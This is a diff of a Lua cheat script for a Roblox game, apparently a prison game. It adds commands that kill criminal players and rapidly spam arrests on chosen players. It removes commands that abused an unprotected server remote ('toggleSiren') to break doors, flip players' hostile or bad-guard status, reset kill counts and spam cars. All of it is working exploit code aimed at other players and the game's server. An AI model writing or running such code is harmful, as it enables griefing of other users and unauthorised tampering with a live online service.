@@ -4952,6 +4820,16 @@ do
         end
     end)
 
+    AddCommand("Killcriminal", {"kcrim", "kc"}, "<players | team...>\nCriminals given players", true, true, function(plr, ...)
+        for i,v in pairs({...}) do
+            for i, v2 in pairs(AGetPlayer(v)) do
+                if v2 == lp then continue end
+
+                KillCrim(v2)
+            end
+        end
+    end)
+
     AddCommand("Spamarrest", "sa", "<player, power, delay>\nSpam arrests given players", true, false, function(plr, ...)
         local plr, power, del = ...
         local aplr = GetPlayer(plr)
@@ -4960,6 +4838,17 @@ do
 
         if MessageBox("Confirm", ("Are you sure you want to spam arrest\n%s?"):format(aplr.Name)) then
             SpamArrest(aplr, tonumber(power) or togs.SpamArrestPower, tonumber(del))
+        end
+    end)
+
+    AddCommand("Fastspamarrest", "fsa", "<player, power, delay>\nSwiftly spam arrests given players", true, false, function(plr, ...)
+        local plr, power = ...
+        local aplr = GetPlayer(plr)
+
+        if not aplr then return end
+
+        if MessageBox("Confirm", ("Are you sure you want to swiftly spam arrest\n%s?"):format(aplr.Name)) then
+            FastSA(aplr, tonumber(power) or 1)
         end
     end)
 
@@ -4993,88 +4882,6 @@ do
 
         for i = 1, 4 do
             workspace.Remote.equipShield:fireServer(s)
-        end
-    end)
-
-    AddCommand("toggledoors", "td", "<>\nBreaks doors", false, true, function()
-        for i,v in pairs(workspace.Doors:GetDescendants()) do
-            if v.Name ~= "isActive" then continue end
-            workspace.Remote.toggleSiren:FireServer({isOn=v})
-        end
-    end)
-
-    AddCommand("hostile", "hos", "<players | teams...>\nHostiles player", false, true, function(plr, ...)
-        for i,v in pairs({...}) do
-            for i, v2 in pairs(AGetPlayer(v)) do
-                if v2 == lp or v2.Name == tostring(plr) or v2.Status.isHostile.Value then continue end
-
-                workspace.Remote.toggleSiren:FireServer({isOn=v2.Status.isHostile})
-            end
-        end
-    end)
-
-    AddCommand("friendly", "fri", "<players | teams...>\nMake player a friendly little goober", false, true, function(plr, ...)
-        for i,v in pairs({...}) do
-            for i, v2 in pairs(AGetPlayer(v)) do
-                if not v2.Status.isHostile.Value then continue end
-
-                workspace.Remote.toggleSiren:FireServer({isOn=v2.Status.isHostile})
-            end
-        end
-    end)
-
-    AddCommand("badguard", "bg", "<players | teams...>\nMakes player bad guard", false, true, function(plr, ...)
-        for i,v in pairs({...}) do
-            for i, v2 in pairs(AGetPlayer(v)) do
-                if v2 == lp or v2.Name == tostring(plr) or v2.Status.isBadGuard.Value then continue end
-
-                workspace.Remote.toggleSiren:FireServer({isOn=v2.Status.isBadGuard})
-            end
-        end
-    end)
-
-    AddCommand("resetkills", "rk", "<players | teams...>\nReset players kills", false, true, function(plr, ...)
-        for i,v in pairs({...}) do
-            for i, v2 in pairs(AGetPlayer(v)) do
-                workspace.Remote.toggleSiren:FireServer({isOn=v2.Status.innocentKills})
-            end
-        end
-    end)
-
-    AddCommand("goodguard", "gg", "<players | teams...>\nMakes player good guard", false, true, function(plr, ...)
-        for i,v in pairs({...}) do
-            for i, v2 in pairs(AGetPlayer(v)) do
-                if not v2.Status.isBadGuard.Value then continue end
-
-                workspace.Remote.toggleSiren:FireServer({isOn=v2.Status.isBadGuard})
-            end
-        end
-    end)
-
-    AddCommand("infcars", "ic", "<>\nMakes anyone able to spam cars", false, true, function()
-        for i,v in pairs(workspace["Prison_ITEMS"].buttons:GetDescendants()) do
-            if v.Name ~= "deb" then continue end
-
-            task.spawn(function()
-                while task.wait() do
-                    if v.Value then continue end
-
-                    workspace.Remote.toggleSiren:FireServer({isOn=v})
-                    v.Changed:Wait()
-                end
-            end)
-        end
-    end)
-
-    AddCommand("spamresetkills", "srk", "<players | teams...>\nReset players kills", false, true, function(plr, ...)
-        for i,v in pairs({...}) do
-            for i, v2 in pairs(AGetPlayer(v)) do
-                task.spawn(function()
-                    while task.wait(.1) do
-                        workspace.Remote.toggleSiren:FireServer({isOn=v2.Status.innocentKills})
-                    end
-                end)
-            end
         end
     end)
 
